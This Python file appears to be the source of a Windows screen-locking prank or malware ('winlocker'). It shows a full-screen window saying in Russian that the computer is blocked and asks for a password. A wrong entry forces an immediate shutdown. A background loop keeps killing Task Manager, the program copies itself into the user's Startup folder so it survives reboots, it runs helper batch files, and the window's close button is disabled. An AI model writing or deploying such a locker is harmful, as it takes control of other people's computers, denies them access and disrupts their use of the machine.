#tkinter import
from tkinter import Tk, Label, Toplevel
import tkinter as tk
import tkinter.font as tkFont

#other import
from os import system
from getpass import getuser
from shutil import move
import threading

import config



class M():
    def run_music():
        M.logs("<M.run_music>: Method was started")
        system("start gamemusic.mp3")
        M.logs("<M.run_music>: Music file was started;\n    End")

    def run_cmd(itterations, command):
        M.logs("<M.run_cmd>: Method was started")

        for i in range(itterations):
            system("start cmd.exe /k" + str(command))
            M.logs("<M.run_cmd>: cmd " + str(i) + " was created")
        M.logs("<M.run_cmd>: End")


    def run_kill():
        M.logs("<M.run_kill>: Method was started")
        system("start system/kill.bat")
        M.logs("<M.run_kill>: File was killed;\n    End")

    def run_password():
        M.logs("<M.run_password>: Method was started;\n    Button was pressed;\n    Request wassword...")
        M.logs("<M.run_password>: inp_pass: " + inp_pass.get())


        if inp_pass.get() == config.key:
            M.logs("<M.run_password>: Access granted; Start Explorer")
            system("start explorer")
            M.logs("<M.run_password>: End of programm;\n    Exit")
            exit()


        else:
            M.logs("<M.run_password>: Acces denide;\n    Shutdown")
            if not config.DEV_MODE_SET_SAFE:
                M.logs("<M.run_password>: Try real shutdown now!")
                system("shutdown /s /t 0")

            M.logs("<M.run_password>: config.DEV_MODE_SET_SAFE: Emitation of shutdown")

    def run_atr():
        M.logs("<M.run_atr>: Method was started")
        try:
            M.logs("<M.run_atr>: Trying using standart arsenal...")
            M.logs("<M.art_run>: Try get data...")
            USER_NAME = getuser()
            dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
            M.logs("<M.run_atr>: End of first part")
        except:
            M.error("<M.run_atr>: Fail of first part")

        M.logs("<M.run_atr>: First part: OK")

        try:
            M.logs("<M.art_run>: Try second part")
            M.logs("<M.atr_run>: Try run .bat script...")
            system("start system/atr.bat")
            M.logs("<M.art_run>: Try third part")
            M.logs("<M.art_run>: Using get data (p1)...")
            M.logs("<M.art_run>: copy ./main.py...")
            move("./main.py", dest)
            M.logs("<M.art_run>:")
            move("./system", dest)
            move("./gamemusic.mp3", dest)
        except:
            pass

    def run_task_kill():
        while True:
            system("Taskkill /f /im taskmgr.exe")

    def logs(log_text):
        if config.DEV_MODE:
            f = open("log.txt", 'a')
            f.write("logs: " + log_text + '\n')
            print("logs: " + log_text + '\n')
            f.close()
    
    def error(log_text):
        if config.DEV_MODE:
            f = open("log.txt", 'a')
            f.write("logs: " + log_text + '\n')
            print("logs: " + log_text + '\n')
            f.close()

def init():
    M.logs("===============================================\nRun theard (task killer)")
    if config.start_thread and not config.DEV_MODE_SET_SAFE:

        thread_taskKiller = threading.Thread(target=M.run_task_kill)
        thread_taskKiller.start()
    else:
        M.logs("(Task-killer): emitation mode")
        

    
    if config.run_music:
        M.run_music()

        M.logs("Music run")

    if config.add_in_autorun and not config.DEV_MODE_SET_SAFE:
        M.run_atr()

        M.logs("Add in autorun")

    if config.run_cmd:
        M.run_cmd(config.cmd_count, config.cmd_command)

        M.logs(str(config.cmd_count) + " cmds was started")

    print(123)
init()

def Quit():
    pass

root = tk.Tk()


#setting title
root.title(config.window_title)
#setting window size
if not(config.run_in_fullscreen):
    width=800
    height=600
    screenwidth = root.winfo_screenwidth()
    screenheight = root.winfo_screenheight()
    alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
    root.geometry(alignstr)

if not config.DEV_MODE:
    root.resizable(width=False, height=False)
else:
    root.resizable(width=True, height=True)
root["bg"] = "black"
root.protocol("WM_DELETE_WINDOW", Quit)

if config.run_in_fullscreen:
    if config.os == 'w':
        try:
            if config.override:
                root.overrideredirect(1)

            root.state('zoomed')

        except:
            pass

    if config.os == 'l':
        try:
            root.attributes('-zoomed', True) 
            root.attributes('-fullscreen', True)
        except:
            pass

lbl_main=tk.Label(root)
lbl_main["activeforeground"] = "#ffffff"
lbl_main["anchor"] = "center"
ft = tkFont.Font(family='Calibri',size=30)
lbl_main["font"] = ft
lbl_main["fg"] = "#ff0000"
lbl_main["bg"] = "black"
lbl_main["justify"] = "center"
lbl_main["text"] = "Ваш компьютер заблокирован!"
lbl_main["relief"] = "flat"
lbl_main.place(
    x=525,
    y=40,
    width=800,
    height=40
    )
lbl_requirement=tk.Label(root)
ft = tkFont.Font(family='Calibri',size=15)
lbl_requirement["font"] = ft
lbl_requirement["fg"] = "#ffffff"
lbl_requirement["bg"] = "black"
lbl_requirement["justify"] = "center"
lbl_requirement["text"] = "Чтоб разблокировать компьютер введите пароль!"
lbl_requirement.place(
    x=515,
    y=200,
    width=800,
    height=30
    )

inp_pass=tk.Entry(root)
inp_pass["borderwidth"] = "1px"
ft = tkFont.Font(family='Calibri',size=10)
inp_pass["font"] = ft
inp_pass["fg"] = "#000000"
inp_pass["bg"] = "#ffffff"
inp_pass.place(
    x=800,
    y=350,
    width=250,
    height=30
    )

btn_entr = tk.Button(root, command=M.run_password)
btn_entr["font"] = ft
btn_entr["fg"] = "#000000"
btn_entr["bg"] = "#ffffff"
btn_entr["text"] = "Ввод"
btn_entr.place(
    x=835,
    y=400,
    width=180,
    height=40
)
    
root.mainloop()